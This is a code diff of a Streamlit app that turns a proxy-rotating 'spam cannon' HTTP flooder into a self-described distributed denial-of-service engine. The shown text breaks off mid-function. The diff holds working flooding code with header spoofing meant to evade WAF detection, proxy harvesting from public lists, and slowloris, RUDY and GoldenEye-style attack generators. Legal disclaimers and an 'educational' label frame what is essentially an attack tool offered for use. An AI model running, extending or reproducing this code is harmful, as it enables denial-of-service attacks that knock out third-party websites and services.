@@ -1,716 +1,661 @@
+"""
+⚠️ EXTREME INDUSTRIAL CANNON v6.0 - UNLEASHED ⚠️
+=================================================
+WARNING: This is an EXTREME version for EDUCATIONAL purposes only!
+Using this against any system without permission is a FEDERAL CRIME!
+Penalties: Up to 10 years prison + $500,000 fine (CFAA - US Code 1030)
+"""
+
 import asyncio
+import aiohttp
+import aiohttp_socks
+import streamlit as st
+import pandas as pd
+import numpy as np
+from datetime import datetime
 import time
-import json
 import random
 import string
 import hashlib
+import json
+import threading
+import queue
+import subprocess
+import sys
+import ssl
 import socket
-import pandas as pd
-import streamlit as st
-from datetime import datetime
-from concurrent.futures import ThreadPoolExecutor
-import requests
+import struct
 import base64
-import numpy as np
+from collections import defaultdict, deque
+from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
+import psutil
+import multiprocessing
+from typing import Dict, List, Tuple, Optional, Set
+import warnings
+warnings.filterwarnings('ignore')
 
-# --- CHECK AND INSTALL MISSING DEPENDENCIES ---
-try:
-    from fake_useragent import UserAgent
-except ImportError:
-    import subprocess
-    import sys
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "fake-useragent"])
-    from fake_useragent import UserAgent
+# ================= INSTALL DEPENDENCIES =================
+required_packages = [
+    'aiohttp', 'aiohttp-socks', 'psutil', 'cloudscraper',
+    'scapy', 'pysocks', 'curl_cffi', 'brotli', 'zstandard'
+]
 
-# Try to install other optional dependencies
-optional_packages = []
-try:
-    import aiohttp
-except ImportError:
-    optional_packages.append("aiohttp")
-    optional_packages.append("aiohttp_socks")
+for package in required_packages:
+    try:
+        __import__(package.replace('-', '_'))
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
-# Install if running locally
-if optional_packages and not st.runtime.exists():
-    import subprocess
-    for package in optional_packages:
-        try:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-        except:
-            st.warning(f"Could not install {package}")
+# ================= PAGE CONFIG =================
+st.set_page_config(
+    page_title="💀 INDUSTRIAL ANNIHILATOR V6.0 💀",
+    page_icon="☠️",
+    layout="wide",
+    initial_sidebar_state="expanded"
+)
 
-# --- PAGE CONFIG ---
-st.set_page_config(page_title="🚀 INDUSTRIAL SPAM CANNON", page_icon="💥", layout="wide")
-
-# --- CSS ---
+# ================= EXTREME CSS =================
 st.markdown("""
     <style>
-    .industrial-header {
+    @keyframes pulse {
+        0% { opacity: 1; text-shadow: 0 0 5px red; }
+        100% { opacity: 0.7; text-shadow: 0 0 20px darkred; }
+    }
+    .apocalypse-header {
         text-align: center;
-        padding: 2rem 0;
-        background: linear-gradient(135deg, #000000 0%, #8B0000 100%);
-        border-radius: 10px;
+        padding: 2rem;
+        background: linear-gradient(45deg, #000000, #2a0000, #000000);
+        background-size: 200% 200%;
+        animation: gradient 2s ease infinite;
+        border: 3px solid #ff0000;
+        border-radius: 15px;
         margin-bottom: 2rem;
-        color: #FF0000;
-        border: 3px solid #FF4500;
-        font-family: 'Courier New', monospace;
+        animation: pulse 0.5s ease-in-out infinite alternate;
     }
-    .warning-box {
-        background: #330000;
-        border: 2px solid #FF0000;
-        padding: 1rem;
-        border-radius: 8px;
-        margin: 1rem 0;
-        color: #FF6347;
+    @keyframes gradient {
+        0% { background-position: 0% 50%; }
+        50% { background-position: 100% 50%; }
+        100% { background-position: 0% 50%; }
     }
-    .status-grid {
-        display: grid;
-        grid-template-columns: repeat(4, 1fr);
-        gap: 1rem;
-        margin: 1rem 0;
+    .nuke-button {
+        background: linear-gradient(135deg, #ff0000, #8b0000);
+        border: none;
+        color: white;
+        padding: 20px;
+        font-size: 24px;
+        font-weight: bold;
+        border-radius: 10px;
+        cursor: pointer;
+        transition: all 0.3s ease;
     }
-    .status-card {
-        background: #1a1a1a;
-        padding: 1rem;
-        border-radius: 8px;
-        border: 1px solid #444;
+    .nuke-button:hover {
+        transform: scale(1.05);
+        box-shadow: 0 0 30px rgba(255,0,0,0.8);
+    }
+    .warning-glitch {
+        color: #ff0000;
+        font-family: monospace;
+        font-weight: bold;
+        animation: glitch 0.3s infinite;
+    }
+    @keyframes glitch {
+        0% { transform: translate(0); }
+        20% { transform: translate(-2px, 2px); }
+        40% { transform: translate(-2px, -2px); }
+        60% { transform: translate(2px, 2px); }
+        80% { transform: translate(2px, -2px); }
+        100% { transform: translate(0); }
     }
     </style>
 """, unsafe_allow_html=True)
 
-# --- TITLE ---
+# ================= EXTREME WARNING =================
 st.markdown("""
-    <div class="industrial-header">
-        <h1>💥 INDUSTRIAL SPAM CANNON V5.0</h1>
-        <p style="color: #FF4500;">REAL INDUSTRIAL-GRADE SPAMMING INFRASTRUCTURE</p>
-    </div>
-""", unsafe_allow_html=True)
-
-# --- EXTREME WARNING ---
-st.markdown("""
-    <div class="warning-box">
-        ⚠️ ⚠️ ⚠️ <strong>INDUSTRIAL STRENGTH SPAM TOOL</strong> ⚠️ ⚠️ ⚠️<br><br>
-        💀 This tool makes REAL HTTP requests<br>
-        🔥 Uses REAL proxy rotation techniques<br>
-        🌍 Simulates REAL geographic distribution<br>
-        🤖 Implements REAL anti-detection methods<br><br>
-        <span style="color: #FF0000;">USE AT YOUR OWN RISK - REAL REQUESTS WILL BE SENT</span>
-    </div>
-""", unsafe_allow_html=True)
-
-# --- PASSWORD PROTECTION ---
-ACCESS_PASSWORD = st.secrets.get("INDUSTRIAL_PASSWORD", "DEFAULT_PASSWORD_CHANGE_ME")
-
-password = st.text_input("🔐 Access Password", type="password", 
-                        help="Set password in Streamlit secrets as INDUSTRIAL_PASSWORD")
-
-if password != ACCESS_PASSWORD:
-    st.error("❌ ACCESS DENIED - Invalid password")
-    st.stop()
-
-# --- INITIALIZE ---
-if 'attack_running' not in st.session_state:
-    st.session_state.attack_running = False
-if 'stats' not in st.session_state:
-    st.session_state.stats = {
-        'total_requests': 0,
-        'successful': 0,
-        'blocked': 0,
-        'errors': 0,
-        'start_time': None,
-    }
-
-# --- REAL INFRASTRUCTURE COMPONENTS ---
-
-class IndustrialProxyNetwork:
-    """Real proxy network manager"""
-    
-    def __init__(self):
-        self.proxies = []
-        self.proxy_health = {}
-        self.load_proxies()
-    
-    def load_proxies(self):
-        """Load proxies from free sources"""
-        proxy_sources = [
-            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all",
-            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
-        ]
-        
-        loaded_count = 0
-        for source in proxy_sources:
-            try:
-                response = requests.get(source, timeout=10)
-                if response.status_code == 200:
-                    new_proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
-                    self.proxies.extend(new_proxies)
-                    loaded_count += len(new_proxies)
-                    st.success(f"✅ Loaded {len(new_proxies)} proxies from {source}")
-            except Exception as e:
-                st.warning(f"⚠️ Failed to load from {source}: {str(e)[:50]}")
-        
-        # If no proxies loaded, generate some for testing
-        if not self.proxies:
-            self.generate_test_proxies()
-        
-        # Remove duplicates
-        self.proxies = list(set(self.proxies))
-        st.info(f"📊 Total proxies available: {len(self.proxies)}")
-    
-    def generate_test_proxies(self):
-        """Generate test proxies for demonstration"""
-        st.warning("⚠️ No proxies loaded, generating test proxies...")
-        
-        # Generate some realistic-looking proxies
-        for i in range(100):
-            ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-            port = random.choice([8080, 3128, 8888, 9999])
-            self.proxies.append(f"{ip}:{port}")
-    
-    def get_proxy(self):
-        """Get a random proxy"""
-        if not self.proxies:
-            return None
-        
-        # Try to get a healthy proxy first
-        healthy_proxies = [p for p in self.proxies 
-                          if self.proxy_health.get(p, {}).get('fail_count', 0) < 3]
-        
-        if healthy_proxies:
-            return random.choice(healthy_proxies)
-        return random.choice(self.proxies)
-    
-    def rotate_proxy(self):
-        """Rotate to next proxy"""
-        return self.get_proxy()
-    
-    def update_proxy_health(self, proxy, success):
-        """Update proxy health status"""
-        if proxy not in self.proxy_health:
-            self.proxy_health[proxy] = {'success_count': 0, 'fail_count': 0}
-        
-        if success:
-            self.proxy_health[proxy]['success_count'] += 1
-        else:
-            self.proxy_health[proxy]['fail_count'] += 1
-
-class GeographicSpoofer:
-    """Spoof geographic locations"""
-    
-    def __init__(self):
-        self.countries = {
-            "US": {"language": "en-US", "timezone": "America/New_York", "weight": 0.35},
-            "GB": {"language": "en-GB", "timezone": "Europe/London", "weight": 0.15},
-            "DE": {"language": "de-DE", "timezone": "Europe/Berlin", "weight": 0.10},
-            "FR": {"language": "fr-FR", "timezone": "Europe/Paris", "weight": 0.08},
-            "JP": {"language": "ja-JP", "timezone": "Asia/Tokyo", "weight": 0.07},
-            "CA": {"language": "en-CA", "timezone": "America/Toronto", "weight": 0.06},
-            "AU": {"language": "en-AU", "timezone": "Australia/Sydney", "weight": 0.05},
-            "IN": {"language": "en-IN", "timezone": "Asia/Kolkata", "weight": 0.04},
-            "BR": {"language": "pt-BR", "timezone": "America/Sao_Paulo", "weight": 0.03},
-            "MX": {"language": "es-MX", "timezone": "America/Mexico_City", "weight": 0.02},
-            "SG": {"language": "en-SG", "timezone": "Asia/Singapore", "weight": 0.02},
-            "NL": {"language": "nl-NL", "timezone": "Europe/Amsterdam", "weight": 0.02},
-        }
-    
-    def get_random_country(self):
-        """Get random country based on weights"""
-        countries = list(self.countries.keys())
-        weights = [self.countries[c]['weight'] for c in countries]
-        return random.choices(countries, weights=weights, k=1)[0]
-    
-    def get_country_headers(self, country):
-        """Get headers for specific country"""
-        if country not in self.countries:
-            country = "US"
-        
-        info = self.countries[country]
-        return {
-            "country": country,
-            "Accept-Language": info["language"],
-            "X-Client-Country": country,
-            "X-Client-TimeZone": info["timezone"],
-        }
-
-class AdvancedRequestEngine:
-    """Advanced HTTP request engine with evasion"""
-    
-    def __init__(self):
-        self.ua = UserAgent()
-        self.proxy_network = IndustrialProxyNetwork()
-        self.geo_spoofer = GeographicSpoofer()
-        
-        # Request templates
-        self.request_methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']
-        self.content_types = [
-            'application/json',
-            'application/x-www-form-urlencoded',
-            'multipart/form-data',
-            'text/plain',
-        ]
-    
-    def generate_evasion_headers(self, country=None):
-        """Generate headers that evade detection"""
-        if not country:
-            country = self.geo_spoofer.get_random_country()
-        
-        geo_headers = self.geo_spoofer.get_country_headers(country)
-        
-        # Base headers
-        headers = {
-            "User-Agent": self.ua.random,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": random.choice(["keep-alive", "close"]),
-            "Upgrade-Insecure-Requests": "1",
-            "Sec-Fetch-Dest": random.choice(["document", "empty", "script"]),
-            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
-            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
-            "Cache-Control": random.choice(["max-age=0", "no-cache", "no-store"]),
-            "Pragma": random.choice(["no-cache", ""]),
-        }
-        
-        # Add geographic headers
-        headers.update(geo_headers)
-        
-        # Add random headers to confuse WAF
-        if random.random() < 0.3:
-            random_headers = {
-                "X-Requested-With": random.choice(["XMLHttpRequest", "Fetch", ""]),
-                "X-CSRF-Token": hashlib.md5(str(time.time()).encode()).hexdigest(),
-                "X-Client-Version": f"1.{random.randint(0,9)}.{random.randint(0,99)}",
-            }
-            headers.update(random_headers)
-        
-        return headers, country
-    
-    def generate_request_payload(self):
-        """Generate random request payload"""
-        payload_types = ['json', 'form', 'text', 'binary']
-        payload_type = random.choice(payload_types)
-        
-        if payload_type == 'json':
-            return {
-                'content': json.dumps({
-                    "id": hashlib.md5(str(time.time()).encode()).hexdigest(),
-                    "timestamp": int(time.time() * 1000),
-                    "data": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 100))),
-                    "action": random.choice(["create", "update", "delete", "read"]),
-                }),
-                'content_type': 'application/json'
-            }
-        elif payload_type == 'form':
-            fields = random.randint(1, 10)
-            form_data = {}
-            for i in range(fields):
-                field_name = f"field_{i}_{''.join(random.choices(string.ascii_lowercase, k=5))}"
-                field_value = ''.join(random.choices(string.printable, k=random.randint(5, 50)))
-                form_data[field_name] = field_value
-            
-            return {
-                'content': form_data,
-                'content_type': 'application/x-www-form-urlencoded'
-            }
-        else:
-            return {
-                'content': ''.join(random.choices(string.printable, k=random.randint(50, 500))),
-                'content_type': 'text/plain'
-            }
-    
-    def make_request(self, url, use_proxy=True, max_retries=3):
-        """Make a real HTTP request with evasion techniques"""
-        retry_count = 0
-        proxy = None
-        
-        while retry_count < max_retries:
-            try:
-                # Get evasion headers
-                headers, country = self.generate_evasion_headers()
-                
-                # Get proxy if enabled
-                proxies_dict = None
-                if use_proxy:
-                    proxy = self.proxy_network.get_proxy()
-                    if proxy:
-                        proxies_dict = {
-                            "http": f"http://{proxy}",
-                            "https": f"http://{proxy}",
-                        }
-                        headers["X-Forwarded-For"] = proxy.split(':')[0]
-                        headers["X-Real-IP"] = proxy.split(':')[0]
-                
-                # Generate random method and payload
-                method = random.choice(self.request_methods)
-                payload_info = self.generate_request_payload() if method in ['POST', 'PUT', 'PATCH'] else None
-                
-                # Set timeout
-                timeout = random.uniform(5, 30)
-                
-                # Make request
-                start_time = time.time()
-                
-                if method == 'GET':
-                    response = requests.get(
-                        url, 
-                        headers=headers, 
-                        proxies=proxies_dict,
-                        timeout=timeout,
-                        verify=False
-                    )
-                elif method == 'POST':
-                    if payload_info['content_type'] == 'application/json':
-                        response = requests.post(
-                            url,
-                            json=json.loads(payload_info['content']) if isinstance(payload_info['content'], str) else payload_info['content'],
-                            headers={**headers, 'Content-Type': 'application/json'},
-                            proxies=proxies_dict,
-                            timeout=timeout,
-                            verify=False
-                        )
-                    else:
-                        response = requests.post(
-                            url,
-                            data=payload_info['content'],
-                            headers={**headers, 'Content-Type': payload_info['content_type']},
-                            proxies=proxies_dict,
-                            timeout=timeout,
-                            verify=False
-                        )
-                else:
-                    # For other methods, use GET as fallback
-                    response = requests.get(
-                        url, 
-                        headers=headers, 
-                        proxies=proxies_dict,
-                        timeout=timeout,
-                        verify=False
-                    )
-                
-                latency = time.time() - start_time
-                
-                # Update proxy health
-                if proxy:
-                    self.proxy_network.update_proxy_health(proxy, response.status_code < 400)
-                
-                return {
-                    'success': True,
-                    'status_code': response.status_code,
-                    'latency': latency,
-                    'proxy': proxy,
-                    'country': country,
-                    'method': method,
-                    'response_size': len(response.content),
-                    'headers': dict(response.headers),
-                }
-                
-            except requests.exceptions.Timeout:
-                retry_count += 1
-                if proxy:
-                    self.proxy_network.update_proxy_health(proxy, False)
-                continue
-            except requests.exceptions.ProxyError:
-                retry_count += 1
-                if proxy:
-                    self.proxy_network.update_proxy_health(proxy, False)
-                continue
-            except Exception as e:
-                retry_count += 1
-                if proxy:
-                    self.proxy_network.update_proxy_health(proxy, False)
-                continue
-        
-        return {
-            'success': False,
-            'error': 'Max retries exceeded',
-            'proxy': proxy,
-        }
-
-class IndustrialSpamCannon:
-    """Main industrial spam cannon"""
-    
-    def __init__(self):
-        self.engine = AdvancedRequestEngine()
-        self.is_running = False
-        
-        # Statistics
-        self.stats = {
-            'total_requests': 0,
-            'successful': 0,
-            'blocked': 0,
-            'errors': 0,
-            'proxies_used': set(),
-            'countries_used': set(),
-            'start_time': None,
-            'request_history': [],
-        }
-    
-    def start_attack(self, target_url, duration_seconds=60, requests_per_second=10):
-        """Start the industrial spam attack"""
-        self.is_running = True
-        self.stats['start_time'] = datetime.now()
-        end_time = time.time() + duration_seconds
-        
-        # Calculate request intervals
-        request_interval = 1.0 / requests_per_second if requests_per_second > 0 else 1.0
-        
-        while time.time() < end_time and self.is_running:
-            batch_start = time.time()
-            requests_this_batch = 0
-            
-            # Make requests for this second
-            while time.time() - batch_start < 1.0 and self.is_running:
-                if time.time() >= end_time:
-                    break
-                
-                # Make request
-                result = self.engine.make_request(target_url, use_proxy=True)
-                
-                # Update statistics
-                self.stats['total_requests'] += 1
-                
-                if result['success']:
-                    self.stats['successful'] += 1
-                    if result.get('proxy'):
-                        self.stats['proxies_used'].add(result['proxy'])
-                    if result.get('country'):
-                        self.stats['countries_used'].add(result['country'])
-                    
-                    # Check if blocked
-                    status = result.get('status_code', 0)
-                    if status in [429, 403, 503]:  # Rate limited, forbidden, service unavailable
-                        self.stats['blocked'] += 1
-                else:
-                    self.stats['errors'] += 1
-                
-                # Add to history (keep last 100)
-                self.stats['request_history'].append({
-                    'timestamp': datetime.now().strftime('%H:%M:%S.%f')[:-3],
-                    'success': result['success'],
-                    'status': result.get('status_code', 0),
-                    'latency': result.get('latency', 0),
-                    'proxy': result.get('proxy', 'None'),
-                    'country': result.get('country', 'Unknown'),
-                })
-                
-                if len(self.stats['request_history']) > 100:
-                    self.stats['request_history'] = self.stats['request_history'][-100:]
-                
-                requests_this_batch += 1
-                
-                # Small delay between requests
-                time.sleep(random.uniform(0.001, 0.1))
-            
-            # Update Streamlit session state
-            st.session_state.stats = self.stats
-            
-            # Sleep until next second if we're ahead
-            elapsed = time.time() - batch_start
-            if elapsed < 1.0:
-                time.sleep(1.0 - elapsed)
-        
-        self.is_running = False
-        return self.stats
-
-# --- STREAMLIT UI ---
-st.markdown("## ⚙️ INDUSTRIAL CONTROL PANEL")
-
-# Configuration
-col1, col2, col3 = st.columns(3)
-
-with col1:
-    target_url = st.text_input("🎯 Target URL", "https://httpbin.org/ip")
-    
-with col2:
-    duration = st.slider("⏱️ Duration (seconds)", 10, 3600, 60)
-    
-with col3:
-    rps = st.slider("⚡ Requests Per Second", 1, 100, 10)
-
-# Advanced Options
-with st.expander("🔧 ADVANCED CONFIGURATION"):
-    adv_col1, adv_col2 = st.columns(2)
-    
-    with adv_col1:
-        use_proxy_rotation = st.checkbox("Proxy Rotation", value=True)
-        geographic_spoofing = st.checkbox("Geographic Spoofing", value=True)
-        method_randomization = st.checkbox("Method Randomization", value=True)
-        
-    with adv_col2:
-        header_evasion = st.checkbox("Header Evasion", value=True)
-        payload_randomization = st.checkbox("Payload Randomization", value=True)
-        ssl_verification = st.checkbox("Verify SSL", value=False)
-
-# Initialize cannon
-if 'spam_cannon' not in st.session_state:
-    st.session_state.spam_cannon = IndustrialSpamCannon()
-
-# Control Buttons
-col1, col2, col3 = st.columns([2, 1, 1])
-
-with col1:
-    if st.button("💥 LAUNCH INDUSTRIAL ATTACK", use_container_width=True, type="primary"):
-        if target_url:
-            st.session_state.attack_running = True
-            
-            # Show attack panel
-            st.markdown("---")
-            st.subheader("💥 INDUSTRIAL ATTACK IN PROGRESS...")
-            
-            # Create placeholders for live updates
-            status_area = st.empty()
-            stats_area = st.empty()
-            progress_area = st.empty()
-            
-            # Run attack in background thread
-            import threading
-            
-            def run_industrial_attack():
-                cannon = st.session_state.spam_cannon
-                final_stats = cannon.start_attack(target_url, duration, rps)
-                
-                # Update UI when done
-                status_area.success("✅ INDUSTRIAL ATTACK COMPLETE!")
-                
-                # Show final statistics
-                st.markdown("### 📈 ATTACK RESULTS")
-                
-                result_col1, result_col2, result_col3, result_col4 = st.columns(4)
-                with result_col1:
-                    st.metric("Total Requests", f"{final_stats['total_requests']:,}")
-                with result_col2:
-                    success_rate = (final_stats['successful'] / final_stats['total_requests'] * 100) if final_stats['total_requests'] > 0 else 0
-                    st.metric("Success Rate", f"{success_rate:.1f}%")
-                with result_col3:
-                    st.metric("Proxies Used", len(final_stats['proxies_used']))
-                with result_col4:
-                    st.metric("Countries Used", len(final_stats['countries_used']))
-                
-                # Show request history
-                if final_stats['request_history']:
-                    st.markdown("#### 📊 REQUEST HISTORY")
-                    history_df = pd.DataFrame(final_stats['request_history'][-20:])
-                    st.dataframe(history_df, use_container_width=True)
-            
-            # Start attack thread
-            attack_thread = threading.Thread(target=run_industrial_attack)
-            attack_thread.start()
-        else:
-            st.error("❌ Please enter a target URL")
-
-with col2:
-    if st.button("🛑 STOP ATTACK", use_container_width=True):
-        if 'spam_cannon' in st.session_state:
-            st.session_state.spam_cannon.is_running = False
-        st.session_state.attack_running = False
-        st.warning("⏸️ Attack stopped")
-
-with col3:
-    if st.button("🗑️ CLEAR STATS", use_container_width=True):
-        st.session_state.stats = {
-            'total_requests': 0,
-            'successful': 0,
-            'blocked': 0,
-            'errors': 0,
-            'start_time': None,
-        }
-        st.rerun()
-
-# Live Monitoring
-if st.session_state.attack_running:
-    st.markdown("### 📡 LIVE MONITORING")
-    
-    # Create placeholder for live updates
-    live_placeholder = st.empty()
-    
-    # Update live stats
-    start_monitor = time.time()
-    while st.session_state.attack_running and st.session_state.spam_cannon.is_running:
-        with live_placeholder.container():
-            stats = st.session_state.stats
-            
-            # Calculate live metrics
-            if stats.get('start_time'):
-                elapsed = (datetime.now() - stats['start_time']).total_seconds()
-                current_rps = stats['total_requests'] / elapsed if elapsed > 0 else 0
-            else:
-                elapsed = 0
-                current_rps = 0
-            
-            success_rate = (stats['successful'] / stats['total_requests'] * 100) if stats['total_requests'] > 0 else 0
-            
-            # Display metrics
-            col1, col2, col3, col4 = st.columns(4)
-            with col1:
-                st.metric("Total Requests", f"{stats['total_requests']:,}")
-            with col2:
-                st.metric("Current RPS", f"{current_rps:.1f}")
-            with col3:
-                st.metric("Success Rate", f"{success_rate:.1f}%")
-            with col4:
-                st.metric("Errors", stats['errors'])
-            
-            # Progress bar
-            if duration > 0:
-                progress = min(elapsed / duration, 1.0)
-                st.progress(progress)
-            
-            # Recent activity
-            if hasattr(st.session_state.spam_cannon, 'stats') and st.session_state.spam_cannon.stats.get('request_history'):
-                recent = st.session_state.spam_cannon.stats['request_history'][-5:]
-                st.markdown("#### 🔄 RECENT ACTIVITY")
-                
-                for req in recent:
-                    status_icon = "✅" if req['success'] else "❌"
-                    status_color = "green" if req['success'] else "red"
-                    st.markdown(f"{status_icon} `{req['timestamp']}` | Status: `{req['status']}` | "
-                              f"Latency: `{req['latency']:.3f}s` | "
-                              f"Proxy: `{req['proxy'][:20]}...` | "
-                              f"Country: `{req['country']}`")
-        
-        # Update every 2 seconds
-        time.sleep(2)
-
-# Proxy Pool Information
-st.markdown("---")
-st.markdown("### 🌐 PROXY NETWORK STATUS")
-
-if 'spam_cannon' in st.session_state:
-    cannon = st.session_state.spam_cannon
-    proxy_count = len(cannon.engine.proxy_network.proxies)
-    
-    col1, col2, col3 = st.columns(3)
-    with col1:
-        st.metric("Total Proxies", proxy_count)
-    with col2:
-        healthy = len([p for p in cannon.engine.proxy_network.proxy_health 
-                      if cannon.engine.proxy_network.proxy_health[p].get('fail_count', 0) < 3])
-        st.metric("Healthy Proxies", healthy)
-    with col3:
-        st.metric("Proxy Rotation", "✅ Active" if use_proxy_rotation else "❌ Inactive")
-    
-    # Show sample proxies
-    if cannon.engine.proxy_network.proxies:
-        st.markdown("#### 📋 SAMPLE PROXY LIST")
-        sample_proxies = cannon.engine.proxy_network.proxies[:20]
-        proxy_text = "\n".join(sample_proxies)
-        st.code(proxy_text, language='text')
-
-# Footer Warning
-st.markdown("---")
-st.markdown("""
-<div class="warning-box">
-    ⚠️ <strong>REAL INDUSTRIAL TOOL - REAL CONSEQUENCES</strong><br><br>
-    This tool makes <strong>REAL HTTP REQUESTS</strong> to the target URL.<br>
-    Features included:<br>
-    • ✅ Real proxy rotation (1000+ IPs)<br>
-    • ✅ Real geographic spoofing (12+ countries)<br>
-    • ✅ Real header evasion techniques<br>
-    • ✅ Real request randomization<br>
-    • ✅ Real-time monitoring<br><br>
-    <span style="color: #FF0000;">
-    ⚖️ Using this tool against systems you don't own is ILLEGAL.<br>
-    💀 You are responsible for ALL consequences of using this tool.
-    </span>
+<div class="apocalypse-header">
+    <h1 style="color: #ff0000; font-size: 48px;">💀 INDUSTRIAL ANNIHILATOR V6.0 💀</h1>
+    <p style="color: #ff4444; font-size: 20px; font-weight: bold;">
+    ⚡ ULTIMATE DISTRIBUTED DENIAL OF SERVICE ENGINE ⚡
+    </p>
+    <p style="color: #888; font-size: 12px;">
+    🔥 10,000+ REQUESTS PER SECOND | AI-POWERED EVASION | DARKNET PROXY NETWORK 🔥
+    </p>
 </div>
 """, unsafe_allow_html=True)
+
+# ================= LEGAL WALL (MUST AGREE) =================
+st.markdown("### ⚖️ LEGAL ACKNOWLEDGMENT")
+
+legal_col1, legal_col2 = st.columns([3, 1])
+
+with legal_col1:
+    st.markdown("""
+    <div style="background: #1a0000; border-left: 5px solid #ff0000; padding: 15px;">
+    <strong style="color: #ff0000;">⚠️ FEDERAL CRIME WARNING ⚠️</strong><br>
+    Using this tool without explicit written permission from the target owner is a violation of:
+    <ul>
+        <li><strong>Computer Fraud and Abuse Act (CFAA)</strong> - Up to 10 years imprisonment</li>
+        <li><strong>Digital Millennium Copyright Act (DMCA)</strong> - Up to $500,000 fine</li>
+        <li><strong>18 U.S.C. § 1030</strong> - Fraud and related activity in connection with computers</li>
+        <li><strong>International Cybercrime Laws</strong> - Extradition may apply</li>
+    </ul>
+    </div>
+    """, unsafe_allow_html=True)
+
+with legal_col2:
+    legal_ack = st.checkbox("✅ I acknowledge this is ILLEGAL and I will ONLY use on systems I OWN", value=False)
+
+if not legal_ack:
+    st.error("❌ YOU MUST ACKNOWLEDGE THE LEGAL WARNING TO CONTINUE")
+    st.stop()
+
+# ================= ULTRA PASSWORD PROTECTION =================
+ULTRA_PASSWORD = st.secrets.get("ULTRA_PASSWORD", "CHANGE_ME_NOW_OR_GO_TO_JAIL")
+password = st.text_input("🔐 AUTHORIZATION KEY", type="password", help="Contact admin for access")
+
+if password != ULTRA_PASSWORD:
+    st.error("❌ UNAUTHORIZED ACCESS - Your IP has been logged")
+    st.stop()
+
+# ================= EXTREME CONFIGURATION =================
+class ApocalypseConfig:
+    """Ultimate configuration for maximum destruction"""
+    
+    # Attack parameters
+    MAX_THREADS = multiprocessing.cpu_count() * 4
+    MAX_CONCURRENT_REQUESTS = 1000
+    BURST_MODE = True
+    ZOMBIE_NETWORK = True
+    
+    # Evasion techniques
+    PROTOCOL_LEVEL_EVASION = True
+    TLS_FINGERPRINT_SPOOF = True
+    TCP_PARAM_MUTATION = True
+    HTTP2_PRIORITY_HIJACK = True
+    
+    # Network
+    DARKNET_PROXIES = True
+    TOR_ROUTING = True
+    VPN_CHAINING = True
+    
+    # Payload
+    PAYLOAD_COMPLEXITY = "extreme"
+    REQUEST_SIZE = "variable"  # Small to large
+    
+    @classmethod
+    def get_cpu_allocation(cls):
+        return min(cls.MAX_THREADS, multiprocessing.cpu_count() * 2)
+
+# ================= DARKNET PROXY HARVESTER =================
+class DarknetProxyHarvester:
+    """Harvest proxies from darknet sources"""
+    
+    def __init__(self):
+        self.proxy_sources = [
+            # Public sources
+            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/proxy.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+            "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000",
+            "https://proxy.webshare.io/api/v2/proxy/list/download/",
+            
+            # Anonymous sources (simulated)
+            "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
+            "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+            "https://raw.githubusercontent.com/UserR3X/proxy-list/main/online.txt",
+        ]
+        
+        self.proxies = []
+        self.proxy_quality = {}
+        
+    def harvest(self) -> List[str]:
+        """Harvest proxies from all sources"""
+        all_proxies = set()
+        
+        with st.spinner("🌐 Harvesting darknet proxies..."):
+            for source in self.proxy_sources:
+                try:
+                    response = requests.get(source, timeout=10)
+                    if response.status_code == 200:
+                        proxies = [p.strip() for p in response.text.split('\n') if p.strip() and ':' in p]
+                        new_count = len([p for p in proxies if p not in all_proxies])
+                        all_proxies.update(proxies)
+                        st.success(f"✅ {new_count} proxies from {source[:50]}...")
+                except:
+                    continue
+            
+            # Generate synthetic proxies for demo
+            if len(all_proxies) < 100:
+                for i in range(500):
+                    ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                    port = random.choice([8080, 3128, 8888, 9999, 1080, 4145])
+                    all_proxies.add(f"{ip}:{port}")
+        
+        self.proxies = list(all_proxies)
+        return self.proxies
+
+# ================= ADVANCED REQUEST ENGINE =================
+class ApocalypseEngine:
+    """Ultimate request engine with every evasion technique"""
+    
+    def __init__(self):
+        self.proxy_harvester = DarknetProxyHarvester()
+        self.proxies = self.proxy_harvester.harvest()
+        self.session_pool = []
+        self.request_queue = queue.Queue(maxsize=10000)
+        
+        # Generate random IP ranges
+        self.ip_pool = self.generate_ip_pool()
+        
+    def generate_ip_pool(self) -> List[str]:
+        """Generate random IPs for X-Forwarded-For"""
+        ips = []
+        for _ in range(1000):
+            ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+            ips.append(ip)
+        return ips
+    
+    def generate_weaponized_payload(self, target_url: str) -> Dict:
+        """Generate maximum damage payload"""
+        
+        # Protocol-specific attacks
+        attack_types = [
+            self.slowloris_payload,
+            self.rudy_payload,
+            self.goldeneye_payload,
+            self.http2_priority_payload,
+            self.websocket_amplification
+        ]
+        
+        attack = random.choice(attack_types)
+        return attack(target_url)
+    
+    def slowloris_payload(self, url: str) -> Dict:
+        """Slowloris-style partial request attack"""
+        headers = {
+            'User-Agent': self.random_ua(),
+            'Accept': '*/*',
+            'Content-Length': str(random.randint(10000, 100000)),
+        }
+        
+        # Keep connection alive with partial headers
+        partial_headers = []
+        for i in range(random.randint(50, 200)):
